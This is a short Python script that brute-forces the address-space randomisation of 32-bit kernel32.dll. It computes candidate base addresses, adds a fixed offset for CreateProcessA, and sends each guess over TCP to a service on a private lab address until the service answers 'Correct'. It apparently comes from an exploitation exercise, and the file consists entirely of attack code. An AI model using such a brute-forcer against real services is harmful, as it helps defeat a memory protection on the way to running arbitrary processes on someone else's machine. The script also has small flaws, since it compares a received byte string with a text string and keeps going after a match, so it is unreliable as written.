import socket
import struct
import pefile
import time

def get_size_of_image(dll_path):
    # SizeOfImage - the size of the contiguous memory that needs to be reserved 
    # to load the file in memory
    pe = pefile.PE(dll_path)
    return pe.OPTIONAL_HEADER.SizeOfImage

PORT = 27015
BITS_ENTROPY_32DLL = 14
MAX_32BIT_USERLAND_ADDR = 1 << 31 # aka 0x80000000

create_processa_offset = 0x33ce0
size_of_image = get_size_of_image("C:\\Windows\\SysWOW64\\kernel32.dll")
max_base_addr_dll_32 = 2**BITS_ENTROPY_32DLL

i = 1
for base_address in range(1, max_base_addr_dll_32):
    base_address = (1 << 30) + (base_address << 16) # bits 30,31 are always constant
    if (base_address + size_of_image) > (MAX_32BIT_USERLAND_ADDR):# pointer can't get larger than userland address space
        break
    final_addr = base_address + create_processa_offset # calculating address of CreateProcessA
    print("Attempt %d. Trying 0x%x" % (i, final_addr))


    value = struct.pack("<Q", final_addr)
    host = "192.168.224.130"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((host, PORT))
            break
        except Exception as e:
            if e.errno == 10061: # connection refused, port is not yet open
                continue
    s.send(value)
    res = s.recv(16)
    if res == "Correct":
        print("Correct address is 0x%x" % final_addr)
        s.close()
    i += 1